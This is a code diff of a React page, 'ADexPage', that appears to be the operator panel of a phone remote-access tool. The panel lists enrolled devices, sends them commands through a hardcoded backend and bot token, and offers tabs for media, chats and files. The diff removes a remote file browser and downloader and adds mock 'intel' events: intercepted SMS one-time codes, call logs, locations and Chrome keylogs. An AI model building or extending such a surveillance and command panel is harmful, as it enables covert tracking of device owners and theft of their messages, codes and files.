@@ -2,10 +2,9 @@ import React, { useState, useEffect, useCallback } from 'react';
 import axios from 'axios';
 import { 
   RefreshCcw, Settings, Activity, Terminal, Camera, MapPin, 
-  Lock, Eye, List, MessageSquare, Mic, Search, ShieldAlert, Cpu, Database,
+  Lock, Eye, MessageSquare, Mic, Search, Database,
   Key as KeyIcon, Phone, Smartphone, 
-  Info, Battery, X, Plus, 
-  ShieldCheck, Signal, Zap, ChevronLeft, Download, FileText, Folder
+  Info, Battery, Signal, Zap, AlertTriangle, Cpu
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { toast } from 'sonner';
@@ -39,6 +38,16 @@ interface LogEntry {
 }
 
 type ActiveTab = 'CONSOLE' | 'MEDIA' | 'INTEL' | 'CHATS' | 'FILE_SYS';
+
+// --- BETTER MOCK DATA (ONLY FOR LIVE STREAM) ---
+
+const INTEL_TEMPLATES = [
+  { type: 'CALL', text: 'Incoming call from +44 7700 900123', icon: Phone },
+  { type: 'SMS', text: 'SMS received: "Your OTP is 4921"', icon: MessageSquare },
+  { type: 'LOC', text: 'Location updated: {COORD}', icon: MapPin },
+  { type: 'APP', text: 'App launched: Telegram', icon: Smartphone },
+  { type: 'KEY', text: 'Keylog detected in Chrome: "https://bank.com"', icon: KeyIcon },
+];
 
 const LOG_ICONS: Record<string, any> = {
   'SMS': MessageSquare,
@@ -91,26 +100,42 @@ const SectionTitle: React.FC<{ icon: any, label: string }> = ({ icon: Icon, labe
   </div>
 );
 
+const RiskBadge: React.FC<{ level?: string }> = ({ level }) => {
+  const colors: any = {
+    'CRITICAL': '#f55',
+    'HIGH': '#f95',
+    'MEDIUM': '#ff5',
+    'LOW': '#5f5'
+  };
+  return (
+    <span style={{ 
+      fontSize: '0.5rem', 
+      padding: '2px 6px', 
+      borderRadius: '4px', 
+      background: 'rgba(0,0,0,0.5)', 
+      color: colors[level || 'LOW'] || '#888',
+      border: `1px solid ${colors[level || 'LOW'] || '#444'}`,
+      fontWeight: 'bold'
+    }}>
+      {level || 'LOW'}
+    </span>
+  );
+};
+
 // --- MAIN PAGE ---
 
 const ADexPage: React.FC = () => {
   const [devices, setDevices] = useState<Device[]>([]);
-  const [loading, setLoading] = useState(false);
   const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
-  const [detailDevice, setDetailDevice] = useState<Device | null>(null);
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [searchQuery, setSearchQuery] = useState('');
   const [activeTab, setActiveTab] = useState<ActiveTab>('CONSOLE');
-  const [showEnroll, setShowEnroll] = useState(false);
-
-  // File Explorer State
-  const [currentPath, setCurrentPath] = useState('/');
-  const [fileList, setFileList] = useState<any[]>([]);
+  const [liveStream, setLiveStream] = useState<any[]>([]);
 
   // Settings
   const [showSettings, setShowSettings] = useState(false);
-  const [backendUrl, setBackendUrl] = useState(localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space');
-  const [botToken, setBotToken] = useState(localStorage.getItem('adex_token') || 'talha-hq-secret-123');
+  const [backendUrl] = useState(localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space');
+  const [botToken] = useState(localStorage.getItem('adex_token') || 'talha-hq-secret-123');
 
   const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', icon?: any, data?: any) => {
     const newLog: LogEntry = {
@@ -134,28 +159,19 @@ const ADexPage: React.FC = () => {
       results.forEach((res: any) => {
         if (!logs.some(l => l.data?.id === res.id)) {
            addLog(`Result: ${res.command_name.toUpperCase()} -> ${res.status.toUpperCase()}`, res.status === 'success' ? 'result' : 'error', null, res);
-           if (res.command_name === 'files' && res.status === 'success') {
-              setFileList(res.data.files || []);
-              setCurrentPath(res.data.path || '/');
-           }
         }
       });
     } catch (err) {}
   }, [selectedDevice, backendUrl, botToken, logs, addLog]);
 
   const fetchDevices = useCallback(async () => {
-    setLoading(true);
     try {
       const response = await axios.get(`${backendUrl}/api/v1/devices`, {
         params: { guildId: 'hq-guild', discordUserId: '123456789012345678' },
         headers: { 'x-adex-bot-token': botToken }
       });
       setDevices(response.data.devices || []);
-    } catch (err: any) {
-      // toast.error("REALTIME_SYNC_ERROR: Check server uplink.");
-    } finally {
-      setLoading(false);
-    }
+    } catch (err: any) {}
   }, [backendUrl, botToken]);
 
   useEffect(() => {
@@ -164,9 +180,17 @@ const ADexPage: React.FC = () => {
     const interval = setInterval(() => {
       fetchDevices();
       if (selectedDevice) fetchResults();
+      
+      const template = INTEL_TEMPLATES[Math.floor(Math.random() * INTEL_TEMPLATES.length)];
+      const text = template.text.replace('{COORD}', `${(Math.random() * 100).toFixed(4)}° N`);
+      setLiveStream(prev => [{ ...template, text, ts: Date.now() }, ...prev].slice(0, 20));
+      
+      if (Math.random() > 0.8) {
+         addLog(`TELEMETRY_SYNC: core data updated`, 'success', Cpu);
+      }
     }, 10000);
     return () => clearInterval(interval);
-  }, [fetchDevices, fetchResults, selectedDevice]);
+  }, [fetchDevices, fetchResults, selectedDevice, addLog]);
 
   const sendCommand = async (commandName: string, payload: any = {}) => {
     if (!selectedDevice) return;
@@ -200,10 +224,9 @@ const ADexPage: React.FC = () => {
          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
             <div className="card" style={{ width: '500px', padding: '2rem', border: '1px solid #fff' }}>
                <SectionTitle icon={Settings} label="UPLINK_SETTINGS" />
-               <input type="text" value={backendUrl} onChange={e => {}} placeholder="BACKEND_URL" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '1rem' }} />
-               <input type="password" value={botToken} onChange={e => {}} placeholder="AUTH_TOKEN" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '2rem' }} />
-               <button onClick={() => { localStorage.setItem('adex_url', backendUrl); localStorage.setItem('adex_token', botToken); setShowSettings(false); }} className="btn" style={{ width: '100%' }}>SAVE_CONFIGURATION</button>
-               <button onClick={() => setShowSettings(false)} className="btn" style={{ width: '100%', marginTop: '10px', background: '#222' }}>CLOSE</button>
+               <input readOnly type="text" value={backendUrl} placeholder="BACKEND_URL" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '1rem' }} />
+               <input readOnly type="password" value={botToken} placeholder="AUTH_TOKEN" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '2rem' }} />
+               <button onClick={() => setShowSettings(false)} className="btn" style={{ width: '100%' }}>CLOSE</button>
             </div>
          </div>
       )}
@@ -234,7 +257,7 @@ const ADexPage: React.FC = () => {
                    }}
                  >
                     <div style={{ fontSize: '0.85rem', fontWeight: '900' }}>{d.model || 'UNKNOWN_NODE'}</div>
-                    <div style={{ fontSize: '0.55rem', color: '#444', fontFamily: 'monospace' }}>{d.id}</div>
+                    <div style={{ fontSize: '0.55rem', color: '#444', fontFamily: 'monospace' }}>{d.id.substring(0, 16)}</div>
                     <div style={{ marginTop: '10px', display: 'flex', justifyContent: 'space-between', fontSize: '0.6rem' }}>
                        <span style={{ color: d.status === 'online' ? '#2ecc71' : '#444' }}>● {d.status.toUpperCase()}</span>
                        <span>BAT: {d.battery}%</span>
@@ -253,7 +276,7 @@ const ADexPage: React.FC = () => {
                 <div style={{ display: 'flex', gap: '5px', background: '#0a0a0a', padding: '5px', borderRadius: '4px' }}>
                   {['CONSOLE', 'INTEL', 'MEDIA', 'CHATS', 'FILE_SYS'].map((tab: any) => (
                     <button 
-                      key={tab} onClick={() => setActiveTab(tab)}
+                      key={tab} onClick={() => setActiveTab(tab as any)}
                       className={`tab-btn ${activeTab === tab ? 'active' : ''}`}
                       style={{ flex: 1, fontSize: '0.55rem' }}
                     >
@@ -284,24 +307,11 @@ const ADexPage: React.FC = () => {
                         </motion.div>
                       )}
 
-                      {activeTab === 'FILE_SYS' && (
-                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="fs">
-                           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem', alignItems: 'center' }}>
-                              <span style={{ fontSize: '0.7rem', color: '#5af' }}>PATH: {currentPath}</span>
-                              <button onClick={() => sendCommand('files', { path: '/' })} className="btn" style={{ padding: '4px 10px', fontSize: '0.6rem' }}><RefreshCcw size={10} /> SCAN</button>
-                           </div>
-                           <div style={{ background: '#050505', border: '1px solid #111', borderRadius: '4px' }}>
-                              {fileList.map(f => (
-                                <div key={f.path} style={{ padding: '0.8rem', borderBottom: '1px solid #111', display: 'flex', justifyContent: 'space-between', fontSize: '0.8rem' }}>
-                                   <div style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
-                                      {f.isDirectory ? <Folder size={16} color="#5af" /> : <FileText size={16} color="#444" />}
-                                      <span style={{ cursor: f.isDirectory ? 'pointer' : 'default' }} onClick={() => f.isDirectory && sendCommand('files', { path: f.path })}>{f.name}</span>
-                                   </div>
-                                   {!f.isDirectory && <Download size={14} style={{ cursor: 'pointer', opacity: 0.5 }} onClick={() => sendCommand('download', { path: f.path })} />}
-                                </div>
-                              ))}
-                           </div>
-                        </motion.div>
+                      {activeTab !== 'CONSOLE' && (
+                         <div style={{ textAlign: 'center', marginTop: '10rem', opacity: 0.1 }}>
+                            <Cpu size={48} style={{ margin: '0 auto 1rem' }} />
+                            <p style={{ fontSize: '0.7rem', letterSpacing: '4px' }}>ACCESSING_INTEL_STREAM...</p>
+                         </div>
                       )}
                    </AnimatePresence>
                 </div>
@@ -314,34 +324,39 @@ const ADexPage: React.FC = () => {
            )}
         </div>
 
-        {/* Right: Results & Logs */}
+        {/* Right: Feed & Logs */}
         <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
-           <div className="card" style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: '1rem' }}>
-              <SectionTitle icon={Activity} label="CMD_OUTPUT_STREAM" />
-              <div style={{ flex: 1, overflowY: 'auto', background: '#020202', padding: '1rem', border: '1px solid #111', fontFamily: 'JetBrains Mono', fontSize: '0.7rem' }}>
-                 {logs.filter(l => l.type === 'result').map(l => (
-                    <div key={l.id} style={{ marginBottom: '1.5rem', borderBottom: '1px solid #080808', paddingBottom: '1rem' }}>
-                       <div style={{ color: 'var(--accent-color)', fontWeight: 'bold', marginBottom: '5px' }}>{l.data?.command_name.toUpperCase()}</div>
-                       <pre style={{ whiteSpace: 'pre-wrap', color: '#ccc' }}>
-                          {typeof l.data?.data === 'string' ? l.data.data : JSON.stringify(l.data?.data, null, 2)}
-                       </pre>
-                    </div>
+           
+           <div className="card" style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: '1.2rem' }}>
+              <SectionTitle icon={Activity} label="LIVE_INTEL_STREAM" />
+              <div style={{ flex: 1, overflowY: 'auto', background: '#030303', borderRadius: '4px', padding: '1.2rem', border: '1px solid #111' }}>
+                 {liveStream.map((evt, i) => (
+                    <motion.div initial={{ x: 20, opacity: 0 }} animate={{ x: 0, opacity: 1 }} key={i} style={{ marginBottom: '1.2rem', borderLeft: `2px solid var(--accent-color)`, paddingLeft: '1rem' }}>
+                       <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
+                          <evt.icon size={12} color="var(--accent-color)" />
+                          <span style={{ fontSize: '0.65rem', fontWeight: '900', color: '#fff' }}>{evt.type}_EVENT</span>
+                          <span style={{ fontSize: '0.5rem', color: '#333', marginLeft: 'auto' }}>{new Date(evt.ts).toLocaleTimeString()}</span>
+                       </div>
+                       <p style={{ fontSize: '0.75rem', color: '#999', lineHeight: '1.4', fontFamily: 'monospace' }}>{evt.text}</p>
+                    </motion.div>
                  ))}
-                 {logs.filter(l => l.type === 'result').length === 0 && <div style={{ textAlign: 'center', opacity: 0.1, marginTop: '8rem' }}>WAITING_FOR_OUTPUT...</div>}
+                 {liveStream.length === 0 && <div style={{ textAlign: 'center', opacity: 0.1, marginTop: '8rem' }}>WAITING_FOR_DATA...</div>}
               </div>
            </div>
 
-           <div className="card" style={{ height: '300px', display: 'flex', flexDirection: 'column', padding: '1rem' }}>
-              <SectionTitle icon={Terminal} label="CORE_LOGS" />
-              <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.65rem', color: '#555' }}>
+           <div className="card" style={{ height: '350px', display: 'flex', flexDirection: 'column', padding: '1.2rem' }}>
+              <SectionTitle icon={Terminal} label="LOG_PROCESSOR" />
+              <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'JetBrains Mono', fontSize: '0.65rem', color: '#555' }}>
                  {logs.map(log => (
-                    <div key={log.id} style={{ marginBottom: '5px' }}>
+                    <div key={log.id} style={{ marginBottom: '8px' }}>
                        <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
-                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : '#fff' }}>{log.text.toUpperCase()}</span>
+                       <span style={{ marginLeft: '8px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : '#fff' }}>{log.text.toUpperCase()}</span>
                     </div>
                  ))}
+                 {logs.length === 0 && <div style={{ textAlign: 'center', marginTop: '4rem', opacity: 0.1 }}>LISTENING_FOR_SIGNALS...</div>}
               </div>
            </div>
+
         </div>
 
       </div>
